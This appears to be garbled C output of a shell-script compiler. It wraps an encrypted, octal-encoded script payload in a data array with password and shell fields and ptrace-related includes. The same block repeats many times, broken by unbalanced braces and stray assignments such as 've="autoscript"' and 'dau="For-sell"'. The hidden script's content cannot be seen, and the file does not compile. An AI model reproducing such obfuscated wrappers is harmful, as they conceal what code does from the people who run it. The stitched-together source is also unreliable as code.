	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
anh="."
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
dua="net"
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
em="/"
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
ve="autoscript"
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
dau="For-sell"
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
tren="Menu"
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
suot="autocript"
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
#define      pswd_z	256
#define      pswd	((&data[113]))
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
neo="Lee"
#define      pswd_z	256
#define      pswd	((&data[113]))
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
lon="Db9"
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
licence () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
